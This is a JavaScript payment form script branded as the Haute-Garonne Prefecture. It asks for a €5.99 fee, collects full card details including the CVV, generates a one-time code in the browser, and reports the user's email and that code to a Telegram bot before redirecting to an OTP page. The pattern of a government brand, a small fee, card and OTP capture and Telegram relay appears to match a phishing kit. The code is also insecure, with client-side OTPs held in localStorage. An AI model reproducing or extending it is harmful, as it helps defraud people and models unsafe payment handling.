document.addEventListener('DOMContentLoaded', function() {
  const form = document.getElementById('paymentForm');
  const errorDiv = document.getElementById('paymentErrors');
  
  form.addEventListener('submit', function(e) {
    e.preventDefault();
    errorDiv.innerHTML = '';
    
    const cardNumber = document.getElementById('cardNumber').value.replace(/\s+/g, '');
    const expMonth = document.getElementById('expMonth').value;
    const expYear = document.getElementById('expYear').value;
    const cvv = document.getElementById('cvv').value;
    const cardName = document.getElementById('cardName').value;
    
    let isValid = true;
    const errors = [];
    
    // Card number validation
    if (!validateCardNumber(cardNumber)) {
      isValid = false;
      errors.push('Invalid card number');
    }
    
    // Expiration date validation
    if (!validateExpirationDate(expMonth, expYear)) {
      isValid = false;
      errors.push('Invalid expiration date');
    }
    
    // CVV validation
    if (!validateCVV(cvv)) {
      isValid = false;
      errors.push('Invalid CVV');
    }
    
    // Cardholder name validation
    if (cardName.trim().length < 2) {
      isValid = false;
      errors.push('Cardholder name must be at least 2 characters');
    }
    
    if (!isValid) {
      errorDiv.innerHTML = errors.join('<br>');
      return;
    }
    
    // Process payment
    if (processPayment(cardNumber, expMonth, expYear, cvv, cardName)) {
      const otpCode = generateOTP();
      localStorage.setItem('otpCode', otpCode);
      localStorage.setItem('paymentTimestamp', Date.now());
      
      // Send email confirmation
      const userEmail = localStorage.getItem('userEmail');
      if (userEmail) {
        emailService.sendEmail({
          to: userEmail,
          subject: 'Haute-Garonne Prefecture - Payment Confirmation',
          body: `Your payment of €5.99 has been processed successfully.\nYour OTP code: ${otpCode}\nThis code is valid for 10 minutes.`
        });
      }
      
      // Send Telegram notification
      telegram.sendMessage({
        chatId: 'prefecture_bot',
        message: `New payment received from user: ${localStorage.getItem('userEmail')}\nAmount: €5.99\nOTP: ${otpCode}\nTimestamp: ${new Date().toISOString()}`
      });
      
      // Show success and redirect
      alert('Payment processed successfully! Please check your email for the OTP code.');
      window.location.href = 'otp.html';
    } else {
      errorDiv.innerHTML = 'Payment processing failed. Please try again.';
    }
  });
});

function validateCardNumber(number) {
  if (number.length < 13 || number.length > 19) return false;
  
  let sum = 0;
  let isEven = false;
  
  for (let i = number.length - 1; i >= 0; i--) {
    let digit = parseInt(number[i]);
    
    if (isEven) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    
    sum += digit;
    isEven = !isEven;
  }
  
  return sum % 10 === 0;
}

function validateExpirationDate(month, year) {
  const now = new Date();
  const currentYear = now.getFullYear();
  const currentMonth = now.getMonth() + 1;
  
  const expYear = parseInt(year);
  const expMonth = parseInt(month);
  
  if (expYear < currentYear) return false;
  if (expYear === currentYear && expMonth < currentMonth) return false;
  
  return true;
}

function validateCVV(cvv) {
  return /^\d{3,4}$/.test(cvv);
}

function processPayment(cardNumber, expMonth, expYear, cvv, cardName) {
  // Simulate payment processing
  const paymentData = {
    cardNumber: cardNumber,
    expMonth: expMonth,
    expYear: expYear,
    cvv: cvv,
    cardName: cardName,
    amount: 5.99,
    currency: 'EUR',
    merchant: 'Haute-Garonne Prefecture'
  };
  
  // In a real implementation, this would send data to a payment gateway
  console.log('Processing payment:', paymentData);
  
  // Simulate successful payment
  return true;
}

function generateOTP() {
  return Math.floor(100000 + Math.random() * 900000).toString();
}